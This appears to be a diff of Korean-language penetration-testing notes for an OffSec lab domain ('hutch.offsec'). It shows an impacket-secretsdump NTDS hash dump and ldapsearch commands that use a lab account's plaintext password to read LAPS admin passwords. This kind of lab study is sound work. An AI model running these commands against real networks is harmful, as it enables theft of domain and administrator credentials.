@@ -17,7 +17,7 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 # LDAP
 ```bash
 ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.160.122" "(objectclass=*)"
-ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H "ldap://<ip>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
 - `-x` : 기본 SASL 인증 대신 간단한 익명 또는 아이디-비밀번호 기반 인증을 사용
 - `-b` :  LDAP 검색을 시작할 루트 경로를 의미. `DC=hutch,DC=offsec` → `hutch.offsec` 도메인을 의미
